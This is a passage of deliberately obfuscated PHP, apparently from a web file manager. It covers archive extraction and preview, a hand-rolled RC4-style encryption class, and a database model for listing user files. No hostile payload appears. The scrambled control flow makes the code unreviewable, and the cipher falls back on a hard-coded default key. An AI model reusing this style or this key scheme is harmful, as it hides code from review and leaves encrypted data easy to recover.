= iconv_to($b°’’±¨’º[$BÉÊİÆ§Óó][$e½ŸñÏ¼æÆ[1895]], $a×ç¢³¸ºƒ, $e½ŸñÏ¼æÆ[322]); unset($b°’’±¨’º[$BÉÊİÆ§Óó][$e½ŸñÏ¼æÆ[1898]]); } } return array($e½ŸñÏ¼æÆ[1035] => !0, $e½ŸñÏ¼æÆ[1037] => $b°’’±¨’º); } else { return array($e½ŸñÏ¼æÆ[1035] => !1, $e½ŸñÏ¼æÆ[1037] => $b°’’±¨’º); } } static function extract($BÊœ‰˜İò¼, $Cã˜çÆ¿ğÚ, $eí‡˜ÀŸëÆ = "\x2d\x31", &$c¾ìˆ‰Ÿİ = false) { goto fŠÓ·Ñ´µ‚; C¤°µ¤Û: $B–®ä®èï† = self::listContent($BÊœ‰˜İò¼, !1); if (!$B–®ä®èï†[$Fàöêõ²¯[1035]]) { return $B–®ä®èï†; } if ($eí‡˜ÀŸëÆ != $Fàöêõ²¯[1034]) { goto B¼äŸÊ¬ÍÍ; aßĞÍÜ‹: if ($a²ö“ï‹‘[$Fàöêõ²¯[76]]) { $FÄ¶‚”·Õ = rtrim($FÄ¶‚”·Õ, $Fàöêõ²¯[8]) . $Fàöêõ²¯[8]; $c¾ìˆ‰Ÿİ = array($c¾ìˆ‰Ÿİ); } $AŠóè¾Û˜© = str_replace($Fàöêõ²¯[93], $Fàöêõ²¯[8], $FÄ¶‚”·Õ); if (substr($AŠóè¾Û˜©, -1) == $Fàöêõ²¯[8]) { if (!strstr(trim($AŠóè¾Û˜©, $Fàöêõ²¯[8]), $Fàöêõ²¯[8])) { $Cã˜çÆ¿ğÚ = $Cã˜çÆ¿ğÚ . get_path_this($AŠóè¾Û˜©) . $Fàöêõ²¯[8]; } } else { if ($eéå´¿Ëæ == $FÄ¶‚”·Õ) { $eéå´¿Ëæ = $Fàöêõ²¯[33]; } } goto Fëâá¬Ûì; a²÷°œæ¹: if ($GLOBALS[$Fàöêõ²¯[6]][$Fàöêõ²¯[1148]] != $Fàöêõ²¯[322]) { $FÄ¶‚”·Õ = unzip_pre_name($c¾ìˆ‰Ÿİ); } $eéå´¿Ëæ = get_path_father($c¾ìˆ‰Ÿİ); if ($eéå´¿Ëæ == $c¾ìˆ‰Ÿİ) { $eéå´¿Ëæ = $Fàöêõ²¯[33]; } goto aßĞÍÜ‹; B¼äŸÊ¬ÍÍ: $a²ö“ï‹‘ = self::fileIndex($B–®ä®èï†[$Fàöêõ²¯[1037]], $eí‡˜ÀŸëÆ); $c¾ìˆ‰Ÿİ = str_replace(array($Fàöêõ²¯[1075], $Fàöêõ²¯[1897]), $Fàöêõ²¯[70], $a²ö“ï‹‘[$Fàöêõ²¯[1895]]); $FÄ¶‚”·Õ = $c¾ìˆ‰Ÿİ; goto a²÷°œæ¹; Fëâá¬Ûì: } goto BŞÜº¥’; BŞÜº¥’: if (self::checkIfType($A„ÖË±‚Ë, $Fàöêõ²¯[1877])) { if ($eí‡˜ÀŸëÆ != $Fàöêõ²¯[1034]) { $FÄ¶‚”·Õ = unzip_pre_name($FÄ¶‚”·Õ); $eéå´¿Ëæ = unzip_pre_name($eéå´¿Ëæ); $A—¦—ÉÈŸ = PclTarExtractList($BÊœ‰˜İò¼, array($FÄ¶‚”·Õ), $Cã˜çÆ¿ğÚ, $eéå´¿Ëæ, $A„ÖË±‚Ë); } else { $A—¦—ÉÈŸ = PclTarExtract($BÊœ‰˜İò¼, $Cã˜çÆ¿ğÚ, $Fàöêõ²¯[357], $A„ÖË±‚Ë); } return array($Fàöêõ²¯[1035] => $A—¦—ÉÈŸ, $Fàöêõ²¯[1037] => PclErrorString(!0)); } else { if (self::checkIfType($A„ÖË±‚Ë, $Fàöêõ²¯[1048])) { return kodRarArchive::extract($BÊœ‰˜İò¼, $Cã˜çÆ¿ğÚ, $A„ÖË±‚Ë, $c¾ìˆ‰Ÿİ); } else { if (kodZipArchive::support($Fàöêõ²¯[1899])) { return kodZipArchive::extract($BÊœ‰˜İò¼, $Cã˜çÆ¿ğÚ, $c¾ìˆ‰Ÿİ); } else { $b¼Ëêƒ†“ = new PclZip($BÊœ‰˜İò¼); if ($eí‡˜ÀŸëÆ != $Fàöêõ²¯[1034]) { $A—¦—ÉÈŸ = $b¼Ëêƒ†“->extract(PCLZIP_OPT_PATH, $Cã˜çÆ¿ğÚ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $Fàöêõ²¯[1900], PCLZIP_OPT_BY_NAME, $a²ö“ï‹‘[$Fàöêõ²¯[1895]], PCLZIP_OPT_REMOVE_PATH, $eéå´¿Ëæ, PCLZIP_OPT_REPLACE_NEWER); } else { $A—¦—ÉÈŸ = $b¼Ëêƒ†“->extract(PCLZIP_OPT_PATH, $Cã˜çÆ¿ğÚ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $Fàöêõ²¯[1900], PCLZIP_OPT_REPLACE_NEWER); } return array($Fàöêõ²¯[1035] => $A—¦—ÉÈŸ, $Fàöêõ²¯[1037] => $b¼Ëêƒ†“->errorName(!0)); } } } return array($Fàöêõ²¯[1035] => !1, $Fàöêõ²¯[1037] => $Fàöêõ²¯[1901]); goto b¬õ¤…Ô’; fŠÓ·Ñ´µ‚: $Fàöêõ²¯ =& $_SERVER[Õİõş]; self::init(); $A„ÖË±‚Ë = !empty($GLOBALS[$Fàöêõ²¯[1052]]) ? $GLOBALS[$Fàöêõ²¯[1052]] : get_path_ext($BÊœ‰˜İò¼); goto C¤°µ¤Û; b¬õ¤…Ô’: } static function fileIndex($eİİôÊÈ, $BŒÜæÔ¹¢™, $CŒÇš¬¡µë = false) { goto DŸŠêßºï; aĞ˜Ÿª²Í: $EÌ—Å…Å÷® = count($eİİôÊÈ); for ($aîŒ–À• ò = 0; $aîŒ–À• ò < $EÌ—Å…Å÷®; $aîŒ–À• ò++) { if ($BŒÜæÔ¹¢™ == $eİİôÊÈ[$aîŒ–À• ò][$c×ñ¹ÒÈŒ[1039]]) { $aùˆ¹¨éƒ = $eİİôÊÈ[$aîŒ–À• ò]; break; } } if (!$aùˆ¹¨éƒ) { show_tips($c×ñ¹ÒÈŒ[1902]); } goto a›‘ÑÆŒ‡Ğ; DŸŠêßºï: $c×ñ¹ÒÈŒ =& $_SERVER[Õİõş]; self::init(); if (!is_array($eİİôÊÈ)) { return !1; } goto aĞ˜Ÿª²Í; a›‘ÑÆŒ‡Ğ: $Fâì…ŒÂŠŒ = $aùˆ¹¨éƒ; if ($CŒÇš¬¡µë) { $Fâì…ŒÂŠŒ = $aùˆ¹¨éƒ[$CŒÇš¬¡µë]; if ($aùˆ¹¨éƒ[$c×ñ¹ÒÈŒ[76]]) { $Fâì…ŒÂŠŒ = rtrim($Fâì…ŒÂŠŒ, $c×ñ¹ÒÈŒ[8]) . $c×ñ¹ÒÈŒ[8]; } } return $Fâì…ŒÂŠŒ; goto CÇ³Øç“Á; CÇ³Øç“Á: } static function extractZipFile($d¿‚‘öÜÇô, $f…²á‡Ö†, $D­…¨ŸÚÂÂ = false) { goto dÒñ¹÷¾Ü; dÒñ¹÷¾Ü: $aÊŒÂë©ÁÊ =& $_SERVER[Õİõş]; self::init(); $a‡ñšù–Ì = TEMP_FILES . hash_path($d¿‚‘öÜÇô) . $aÊŒÂë©ÁÊ[8]; goto F¹‰˜‡›ôà; A™ØÜ : $E§Óª¼Û = get_path_father($f…²á‡Ö†); if ($E§Óª¼Û == $f…²á‡Ö†) { $E§Óª¼Û = $aÊŒÂë©ÁÊ[33]; } $FÔ¢–‚¾«š = $cßùĞí¨“¹->extract(PCLZIP_OPT_PATH, $a‡ñšù–Ì, PCLZIP_CB_PRE_FILE_NAME, $aÊŒÂë©ÁÊ[1900], PCLZIP_OPT_REMOVE_PATH, $E§Óª¼Û, PCLZIP_OPT_BY_NAME, $f…²á‡Ö†); goto E«ğÖ¬à„˜; E«ğÖ¬à„˜: if (!file_exists($fğ§¸áµ‹)) { return !1; } @rename($fğ§¸áµ‹, $EŒ¬Œ¹†²•); return $EŒ¬Œ¹†²•; goto F˜öÑÎ”¹Ü; F¹‰˜‡›ôà: mk_dir($a‡ñšù–Ì); $EŒ¬Œ¹†²• = $a‡ñšù–Ì . md5($d¿‚‘öÜÇô . $f…²á‡Ö†); if ($D­…¨ŸÚÂÂ) { $EŒ¬Œ¹†²• = $a‡ñšù–Ì . $D­…¨ŸÚÂÂ; } goto EéÆÌ£à„; EéÆÌ£à„: if (file_exists($EŒ¬Œ¹†²•)) { return $EŒ¬Œ¹†²•; } $cßùĞí¨“¹ = new PclZip($d¿‚‘öÜÇô); $fğ§¸áµ‹ = unzip_filter_ext($a‡ñšù–Ì . get_path_this($f…²á‡Ö†)); goto A™ØÜ ; F˜öÑÎ”¹Ü: } static function filePreview($cî„õÃÔÄ, $FÁ†¸å¬Ï«, $Bêäİˆ‰Ğ = false, $bÛ–ƒõõÏÃ = false) { goto E®ñÅµ‘Ù; B†Ïã‘‚¤×: mk_dir($f§ÒÀÒ©®İ); $f¤ä¢ÅĞÎ‰ = $f§ÒÀÒ©®İ . md5($cî„õÃÔÄ . $FÁ†¸å¬Ï« . $bÛ–ƒõõÏÃ); $B“’¢ŞÄİø = $AŞĞ †Öˆï[33]; goto fôîØ…ÃÔ¬; Eùµ÷Î¹é: $B“’¢ŞÄİø = unzip_pre_name($B“’¢ŞÄİø); $AÂ‘Ô¯¡¸™ = get_path_this($B“’¢ŞÄİø); $A•à¡«Ğˆ = unzip_filter_ext($f§ÒÀÒ©®İ . $AÂ‘Ô¯¡¸™); goto dñÚ‰¨±”Ç; E®ñÅµ‘Ù: $AŞĞ †Öˆï =& $_SERVER[Õİõş]; self::init(); $f§ÒÀÒ©®İ = TEMP_FILES . hash_path($cî„õÃÔÄ) . $AŞĞ †Öˆï[8]; goto B†Ïã‘‚¤×; fôîØ…ÃÔ¬: $fİŒê¨’¼¬ = self::extract($cî„õÃÔÄ, $f§ÒÀÒ©®İ, $FÁ†¸å¬Ï«, $B“’¢ŞÄİø); if (is_array($B“’¢ŞÄİø)) { show_json($AŞĞ †Öˆï[1903], !1); } if (file_exists($f¤ä¢ÅĞÎ‰)) { IO::fileOut($f¤ä¢ÅĞÎ‰, $Bêäİˆ‰Ğ, get_path_this($B“’¢ŞÄİø)); return; } goto Eùµ÷Î¹é; dñÚ‰¨±”Ç: if (!$fİŒê¨’¼¬[$AŞĞ †Öˆï[1035]]) { show_json($fİŒê¨’¼¬[$AŞĞ †Öˆï[1037]], !1); } if (!file_exists($A•à¡«Ğˆ)) { show_json($AŞĞ †Öˆï[1904], !1); } @rename($A•à¡«Ğˆ, $f¤ä¢ÅĞÎ‰); goto BÖ§×õíÙÏ; BÖ§×õíÙÏ: if (!file_exists($f¤ä¢ÅĞÎ‰)) { del_dir($f§ÒÀÒ©®İ); show_json($AŞĞ †Öˆï[1905]); } IO::fileOut($f¤ä¢ÅĞÎ‰, $Bêäİˆ‰Ğ, $AÂ‘Ô¯¡¸™); goto e°†ùÔã…«; e°†ùÔã…«: } static function create($C¤ÁØÈÓÀ¯, $f³£”½áí) { $Dˆß£¡¥ßš =& $_SERVER[Õİõş]; self::init(); $d‡İø îñ = get_path_ext($C¤ÁØÈÓÀ¯); $Fîš¡Ìô = !1; if (self::checkIfType($d‡İø îñ, $Dˆß£¡¥ßš[297])) { if (kodZipArchive::support($Dˆß£¡¥ßš[1012])) { return kodZipArchive::create($C¤ÁØÈÓÀ¯, $f³£”½áí); } $Aäöë²‡” = new PclZip($C¤ÁØÈÓÀ¯); foreach ($f³£”½áí as $BÒîšõÔŠÑ => $A¸¥¼Ã½”) { $A¸¥¼Ã½” = str_replace($Dˆß£¡¥ßš[462], $Dˆß£¡¥ßš[8], $A¸¥¼Ã½”); $D¢˜³³— = Kodio::clear(get_path_father($A¸¥¼Ã½”)); if ($BÒîšõÔŠÑ == 0) { $Fîš¡Ìô = $Aäöë²‡”->create($A¸¥¼Ã½”, PCLZIP_OPT_REMOVE_PATH, $D¢˜³³—, PCLZIP_CB_PRE_FILE_NAME, $Dˆß£¡¥ßš[1906]); continue; } $Fîš¡Ìô = $Aäöë²‡”->add($A¸¥¼Ã½”, PCLZIP_OPT_REMOVE_PATH, $D¢˜³³—, PCLZIP_CB_PRE_FILE_NAME, $Dˆß£¡¥ßš[1906]); } } else { if (self::checkIfType($d‡İø îñ, $Dˆß£¡¥ßš[1877])) { foreach ($f³£”½áí as $BÒîšõÔŠÑ => $A¸¥¼Ã½”) { $A¸¥¼Ã½” = str_replace($Dˆß£¡¥ßš[462], $Dˆß£¡¥ßš[8], $A¸¥¼Ã½”); $D¢˜³³— = Kodio::clear(get_path_father($A¸¥¼Ã½”)); if ($BÒîšõÔŠÑ == 0) { $Fîš¡Ìô = PclTarCreate($C¤ÁØÈÓÀ¯, array($A¸¥¼Ã½”), $d‡İø îñ, null, $D¢˜³³—); continue; } $Fîš¡Ìô = PclTarAddList($C¤ÁØÈÓÀ¯, array($A¸¥¼Ã½”), $Dˆß£¡¥ßš[33], $D¢˜³³—, $d‡İø îñ); } } } return $Fîš¡Ìô; } } class Mcrypt { public static $defaultKey = "\x61\41\164\x61\153\x41\x3a\144\154\x6d\143\x6c\x64\x45\166\x2c\x65"; public static function encode($a½ØÆ‡à—‘, $FÂæİ®™÷À = '', $Fê³£Éí = 0, $e¼¡®ÄÔˆœ = '') { goto F’÷ò•Çí; f…ÄŠÊ’ğö: for ($dŸ ¶¥ƒ¹¨ = 0; $dŸ ¶¥ƒ¹¨ <= 255; $dŸ ¶¥ƒ¹¨++) { $Fã‘¬İÙÑ[$dŸ ¶¥ƒ¹¨] = ord($F†Ù ŒÜçƒ[$dŸ ¶¥ƒ¹¨ % $A¼Õ­ÊÃÛÛ]); } $CÑÍâ«ÈÒ = range(0, 255); for ($d‚±§ÛÅ = $dŸ ¶¥ƒ¹¨ = 0; $dŸ ¶¥ƒ¹¨ < 256; $dŸ ¶¥ƒ¹¨++) { $d‚±§ÛÅ = ($d‚±§ÛÅ + $CÑÍâ«ÈÒ[$dŸ ¶¥ƒ¹¨] + $Fã‘¬İÙÑ[$dŸ ¶¥ƒ¹¨]) % 256; $fçëŠâÜÌ¿ = $CÑÍâ«ÈÒ[$dŸ ¶¥ƒ¹¨]; $CÑÍâ«ÈÒ[$dŸ ¶¥ƒ¹¨] = $CÑÍâ«ÈÒ[$d‚±§ÛÅ]; $CÑÍâ«ÈÒ[$d‚±§ÛÅ] = $fçëŠâÜÌ¿; } goto FåçŸö©ø‡; fô´ğÅÔ: $a¯‚Š›¹Çé = md5(substr($FÂæİ®™÷À, 0, 16)); $a²Ããù¸ = md5(substr($FÂæİ®™÷À, 16, 16)); $e¼¡®ÄÔˆœ = $e¼¡®ÄÔˆœ ? $e¼¡®ÄÔˆœ : md5(microtime()); goto fäÙ¨ÏÏÓ; fäÙ¨ÏÏÓ: $DŞ²¹‰‰ñ¶ = substr($e¼¡®ÄÔˆœ, -$EéÌ½ÅÀÈì); $F†Ù ŒÜçƒ = $a¯‚Š›¹Çé . md5($a¯‚Š›¹Çé . $DŞ²¹‰‰ñ¶); $A¼Õ­ÊÃÛÛ = strlen($F†Ù ŒÜçƒ); goto F’öĞ›‡¾ñ; F’÷ò•Çí: $c¬ãÛ¸¾† =& $_SERVER[Õİõş]; $EéÌ½ÅÀÈì = 4; $FÂæİ®™÷À = md5($FÂæİ®™÷À ? $FÂæİ®™÷À : self::$defaultKey); goto fô´ğÅÔ; F’öĞ›‡¾ñ: $a½ØÆ‡à—‘ = sprintf($c¬ãÛ¸¾†[1907], $Fê³£Éí ? $Fê³£Éí + time() : 0) . substr(md5($a½ØÆ‡à—‘ . $a²Ããù¸), 0, 16) . $a½ØÆ‡à—‘; $D¸ÙÑğİÛ = strlen($a½ØÆ‡à—‘); $Fã‘¬İÙÑ = array(); goto f…ÄŠÊ’ğö; aĞ™½”Œ¦”: $E™‡—ëß³á = str_replace(array($c¬ãÛ¸¾†[280], $c¬ãÛ¸¾†[8], $c¬ãÛ¸¾†[911]), array($c¬ãÛ¸¾†[407], $c¬ãÛ¸¾†[70], $c¬ãÛ¸¾†[91]), $E™‡—ëß³á); return $E™‡—ëß³á; goto c¹‚ÙÀ×¤ƒ; FåçŸö©ø‡: $E™‡—ëß³á = $c¬ãÛ¸¾†[33]; for ($dŠê‘•ÛŠ = $d‚±§ÛÅ = $dŸ ¶¥ƒ¹¨ = 0; $dŸ ¶¥ƒ¹¨ < $D¸ÙÑğİÛ; $dŸ ¶¥ƒ¹¨++) { $dŠê‘•ÛŠ = ($dŠê‘•ÛŠ + 1) % 256; $d‚±§ÛÅ = ($d‚±§ÛÅ + $CÑÍâ«ÈÒ[$dŠê‘•ÛŠ]) % 256; $fçëŠâÜÌ¿ = $CÑÍâ«ÈÒ[$dŠê‘•ÛŠ]; $CÑÍâ«ÈÒ[$dŠê‘•ÛŠ] = $CÑÍâ«ÈÒ[$d‚±§ÛÅ]; $CÑÍâ«ÈÒ[$d‚±§ÛÅ] = $fçëŠâÜÌ¿; $E™‡—ëß³á .= chr(ord($a½ØÆ‡à—‘[$dŸ ¶¥ƒ¹¨]) ^ $CÑÍâ«ÈÒ[($CÑÍâ«ÈÒ[$dŠê‘•ÛŠ] + $CÑÍâ«ÈÒ[$d‚±§ÛÅ]) % 256]); } $E™‡—ëß³á = $DŞ²¹‰‰ñ¶ . str_replace($c¬ãÛ¸¾†[911], $c¬ãÛ¸¾†[33], base64_encode($E™‡—ëß³á)); goto aĞ™½”Œ¦”; c¹‚ÙÀ×¤ƒ: } public static function decode($bÑ°Ğ¿©¤Ô, $a¶ÏÜ™©ÉÈ = '') { goto báÄÚ––øˆ; Fõ‡Æ”í¸÷: $bÑ°Ğ¿©¤Ô = base64_decode(substr($bÑ°Ğ¿©¤Ô, $d§„•…ŒÔ‰)); $EƒÅ›ÆÃô™ = strlen($bÑ°Ğ¿©¤Ô); $b¼ÂÒê¤ô¶ = array(); goto DÍÖ„²ŠÜ; DÍÖ„²ŠÜ: for ($aœÁ•„ÊÍğ = 0; $aœÁ•„ÊÍğ <= 255; $aœÁ•„ÊÍğ++) { $b¼ÂÒê¤ô¶[$aœÁ•„ÊÍğ] = ord($BŸÓà’…Ú[$aœÁ•„ÊÍğ % $eóÂÊŒŞàÇ]); } $Bšİ¯ƒë = range(0, 255); for ($Fß„Ìáœî… = $aœÁ•„ÊÍğ = 0; $aœÁ•„ÊÍğ < 256; $aœÁ•„ÊÍğ++) { $Fß„Ìáœî… = ($Fß„Ìáœî… + $Bšİ¯ƒë[$aœÁ•„ÊÍğ] + $b¼ÂÒê¤ô¶[$aœÁ•„ÊÍğ]) % 256; $cĞ¶ãÍ¸Æ = $Bšİ¯ƒë[$aœÁ•„ÊÍğ]; $Bšİ¯ƒë[$aœÁ•„ÊÍğ] = $Bšİ¯ƒë[$Fß„Ìáœî…]; $Bšİ¯ƒë[$Fß„Ìáœî…] = $cĞ¶ãÍ¸Æ; } goto D±Â§›ÏŞ©; D±Â§›ÏŞ©: $eè‰á‹©ä = $bøÍÁñÒÏ×[33]; for ($cŒ¹šÊ¨ = $Fß„Ìáœî… = $aœÁ•„ÊÍğ = 0; $aœÁ•„ÊÍğ < $EƒÅ›ÆÃô™; $aœÁ•„ÊÍğ++) { $cŒ¹šÊ¨ = ($cŒ¹šÊ¨ + 1) % 256; $Fß„Ìáœî… = ($Fß„Ìáœî… + $Bšİ¯ƒë[$cŒ¹šÊ¨]) % 256; $cĞ¶ãÍ¸Æ = $Bšİ¯ƒë[$cŒ¹šÊ¨]; $Bšİ¯ƒë[$cŒ¹šÊ¨] = $Bšİ¯ƒë[$Fß„Ìáœî…]; $Bšİ¯ƒë[$Fß„Ìáœî…] = $cĞ¶ãÍ¸Æ; $eè‰á‹©ä .= chr(ord($bÑ°Ğ¿©¤Ô[$aœÁ•„ÊÍğ]) ^ $Bšİ¯ƒë[($Bšİ¯ƒë[$cŒ¹šÊ¨] + $Bšİ¯ƒë[$Fß„Ìáœî…]) % 256]); } $eâ•±Ø©Ç½ = intval(substr($eè‰á‹©ä, 0, 10)); goto B™ ò´›µÂ; EßŠÚÅÈ‚‹: $a¶ÏÜ™©ÉÈ = md5($a¶ÏÜ™©ÉÈ ? $a¶ÏÜ™©ÉÈ : self::$defaultKey); $CİâÃ¬±ß¬ = md5(substr($a¶ÏÜ™©ÉÈ, 0, 16)); $Cè¨Ç¯‰Şƒ = md5(substr($a¶ÏÜ™©ÉÈ, 16, 16)); goto eÉâˆåË; báÄÚ––øˆ: $bøÍÁñÒÏ× =& $_SERVER[Õİõş]; $bÑ°Ğ¿©¤Ô = str_replace(array($bøÍÁñÒÏ×[407], $bøÍÁñÒÏ×[70], $bøÍÁñÒÏ×[91]), array($bøÍÁñÒÏ×[280], $bøÍÁñÒÏ×[8], $bøÍÁñÒÏ×[911]), $bÑ°Ğ¿©¤Ô); $d§„•…ŒÔ‰ = 4; goto EßŠÚÅÈ‚‹; eÉâˆåË: $FÙ‚Êä”•À = substr($bÑ°Ğ¿©¤Ô, 0, $d§„•…ŒÔ‰); $BŸÓà’…Ú = $CİâÃ¬±ß¬ . md5($CİâÃ¬±ß¬ . $FÙ‚Êä”•À); $eóÂÊŒŞàÇ = strlen($BŸÓà’…Ú); goto Fõ‡Æ”í¸÷; B™ ò´›µÂ: if (($eâ•±Ø©Ç½ == 0 || $eâ•±Ø©Ç½ - time() > 0) && substr($eè‰á‹©ä, 10, 16) == substr(md5(substr($eè‰á‹©ä, 26) . $Cè¨Ç¯‰Şƒ), 0, 16)) { return substr($eè‰á‹©ä, 26); } else { return $bøÍÁñÒÏ×[33]; } goto CÌÒ©•ÉÕ; CÌÒ©•ÉÕ: } } define($_SERVER[Õİõş][1908], 1); goto CšæîùÈ„; eŠ‡êçâ­Ó: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\x72\x63\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\x61\155\145" => "\x69\157\137\163\x6f\x75\x72\x63\x65\137\155\145\x74\141", "\155\145\x74\x61\106\151\145\154\144" => "\x73\x6f\165\162\x63\x65\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\144\x69\146\x79\124\151\155\x65", "\164\x69\x6d\x65", "\x69\x6e\163\145\x72\x74", "\x66\x75\156\143\164\151\x6f\x6e"), array("\x63\x72\145\141\164\x65\x54\151\x6d\x65", "\x74\151\x6d\145", "\x69\x6e\163\145\162\164", "\146\x75\x6e\143\164\x69\157\x6e"), array("\166\x69\145\x77\x54\151\x6d\x65", "\x74\151\155\145", "\151\156\163\x65\162\x74", "\x66\165\x6e\143\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($C²šÍ‘†»…) { return $this->listSource(array($_SERVER[Õİõş][364] => $C²šÍ‘†»…)); } public function typeName($EÔ¬ÙÂòâÃ) { static $d•Û¤„ªè¯ = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\145\x6d", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\x72\157\165\160"); return $d•Û¤„ªè¯[$EÔ¬ÙÂòâÃ . $_SERVER[Õİõş][33]]; } public function sourceListInfo($Fù¢¿‹Òøó, $Bî¬Å‘²Ğ = false) { goto FÊòÓö¸Ñ; FÊòÓö¸Ñ: $BĞÊ½‡»ò =& $_SERVER[Õİõş]; $Fù¢¿‹Òøó = $Fù¢¿‹Òøó ? $Fù¢¿‹Òøó : array(); $Fù¢¿‹Òøó = array_filter(array_unique($Fù¢¿‹Òøó)); goto aÉÏÏ‘ì; E‘¾†‚ç…¢: return array_to_keyvalue($bÏÛáÍà, $BĞÊ½‡»ò[365]); goto BŠ²À—ùÀ´; aÉÏÏ‘ì: if (!$Fù¢¿‹Òøó) { return array(); } $bÏÛáÍà = $this->where(array($BĞÊ½‡»ò[365] => array($BĞÊ½‡»ò[7], $Fù¢¿‹Òøó)))->select(); $this->_listDataApply($bÏÛáÍà, $Bî¬Å‘²Ğ); goto E‘¾†‚ç…¢; BŠ²À—ùÀ´: } public function pathInfoFilter($f¹™¾¡É©­) { goto d’›ÍËÆÂø; d’›ÍËÆÂø: $a·—¤­ç‘ =& $_SERVER[Õİõş]; $f¹™¾¡É©­[$a·—¤­ç‘[75]] = KodIO::make($f¹™¾¡É©­[$a·—¤­ç‘[365]]); $f¹™¾¡É©­[$a·—¤­ç‘[29]] = $f¹™¾¡É©­[$a·—¤­ç‘[366]] == 1 ? $a·—¤­ç‘[76] : $a·—¤­ç‘[163]; goto FŒ¹á…‘µ„; eë˜¶Ã™ß‰: if (isset($f¹™¾¡É©­[$a·—¤­ç‘[372]]) && $f¹™¾¡É©­[$a·—¤­ç‘[372]][$a·—¤­ç‘[373]] == -1) { $fì…¨Æœ = array_remove_value($fì…¨Æœ, $a·—¤­ç‘[183]); $fì…¨Æœ = array_remove_value($fì…¨Æœ, $a·—¤­ç‘[106]); $fì…¨Æœ = array_remove_value($fì…¨Æœ, $a·—¤­ç‘[374]); $fì…¨Æœ = array_remove_value($fì…¨Æœ, $a·—¤­ç‘[375]); $fì…¨Æœ = array_remove_value($fì…¨Æœ, $a·—¤­ç‘[77]); $fì…¨Æœ = array_remove_value($fì…¨Æœ, $a·—¤­ç‘[376]); } $f¹™¾¡É©­ = array_field_key($f¹™¾¡É©­, $fì…¨Æœ); return $f¹™¾¡É©­; goto CğÅßù…İÙ; FŒ¹á…‘µ„: $f¹™¾¡É©­[$a·—¤­ç‘[367]] = $this->typeName($f¹™¾¡É©­[$a·—¤­ç‘[367]]); if ($f¹™¾¡É©­[$a·—¤­ç‘[366]] != 1) { $f¹™¾¡É©­[$a·—¤­ç‘[156]] = $f¹™¾¡É©­[$a·—¤­ç‘[368]]; unset($f¹™¾¡É©­[$a·—¤­ç‘[368]]); } $c†¿¤š´Š¶ = $a·—¤­ç‘[369]; goto AßÌ¾øëŸ‡; AßÌ¾øëŸ‡: $c†¿¤š´Š¶ .= $a·—¤­ç‘[370]; $c†¿¤š´Š¶ .= $a·—¤­ç‘[371]; $fì…¨Æœ = explode($a·—¤­ç‘[47], $c†¿¤š´Š¶); goto eë˜¶Ã™ß‰; CğÅßù…İÙ: } public function listUserFav() { goto aÙóÆÔ¸ëÊ; aÙóÆÔ¸ëÊ: $F§äç®§›‚ =& $_SERVER[Õİõş]; $E„§¸İÅê = Model($F§äç®§›‚[377])->listData(); $e°ã¾¦«ÇĞ = array_filter_by_field($E„§¸İÅê, $F§äç®§›‚[29], $F§äç®§›‚[378]); goto e÷ã…óˆç; e÷ã…óˆç: $e°ã¾¦«ÇĞ = array_to_keyvalue($e°ã¾¦«ÇĞ, $F§äç®§›‚[33], $F§äç®§›‚[75]); if ($e°ã¾¦«ÇĞ) { $AŒë—µŞÔ¼ = $this->listSource(array($F§äç®§›‚[379] => array($F§äç®§›‚[380], $e°ã¾¦«ÇĞ))); } $AŒë—µŞÔ¼ = array_to_keyvalue($AŒë—µŞÔ¼[$F§äç®§›‚[350]], $F§äç®§›‚[365]); goto C”ˆ¼òğÍ; C”ˆ¼òğÍ: foreach ($E„§¸İÅê as &$céé»³§¿ó) { $céé»³§¿ó = array($F§äç®§›‚[381] => $céé»³§¿ó[$F§äç®§›‚[363]], $F§äç®§›‚[382] => $céé»³§¿ó[$F§äç®§›‚[28]], $F§äç®§›‚[383] => $céé»³§¿ó[$F§äç®§›‚[75]], $F§äç®§›‚[384] => $céé»³§¿ó[$F§äç®§›‚[29]], $F§äç®§›‚[385] => $céé»³§¿ó[$F§äç®§›‚[183]], $F§äç®§›‚[386] => $céé»³§¿ó[$F§äç®§›‚[106]]); if ($céé»³§¿ó[$F§äç®§›‚[29]] == $F§äç®§›‚[378] && $AŒë—µŞÔ¼[$céé»³§¿ó[$F§äç®§›‚[75]]]) { $céé»³§¿ó[$F§äç®§›‚[387]] = $AŒë—µŞÔ¼[$céé»³§¿ó[$F§äç®§›‚[75]]]; } } return $E„§¸İÅê; goto b±áì•øÛˆ; b±áì•øÛˆ: } public function listUserTag($eÂŒ‘îÊ·) { goto A¬Ë°åÜî; A¬Ë°åÜî: $C÷…œÌ…œÜ =& $_SERVER[Õİõş]; $cøÔÅ´ğµ = Model($C÷…œÌ…œÜ[388])->listData(); $cŒğ•¬ã­‘ = array_filter_by_field($cøÔÅ´ğµ, $C÷…œÌ…œÜ[389], $eÂŒ‘îÊ·); goto e ø†õ£¬; bµÇ¨ÙíãÜ: return $this->listSource($bÖÂï¾·½ç); goto D ïëˆÈ”†; e ø†õ£¬: $cŒğ•¬ã­‘ = array_to_keyvalue($cŒğ•¬ã­‘, $C÷…œÌ…œÜ[33], $C÷…œÌ…œÜ[75]); if (!$cŒğ•¬ã­‘) { return array(); } $bÖÂï¾·½ç = array($C÷…œÌ…œÜ[379] => array($C÷…œÌ…œÜ[380], $cŒğ•¬ã­‘)); goto bµÇ¨ÙíãÜ; D ïëˆÈ”†: } public function listUserRecycle() { $Cö’âÃ©„ =& $_SERVER[Õİõş]; $dÁîä×†ç÷ = Model($Cö’âÃ©„[390])->listData(); if (!$dÁîä×†ç÷) { return array(); } $eÚ¨Ü›å·µ = array($Cö’âÃ©„[379] => array($Cö’âÃ©„[380], $dÁîä×†ç÷), $Cö’âÃ©„[391] => 1); return $this->listSource($eÚ¨Ü›å·µ); } public function listSource($dì¿åÄøÎ, $AÈ©Ü¢ö¤º = 3000) { goto bĞë­ö‡é; bĞë­ö‡é: $b ñËŠá † =& 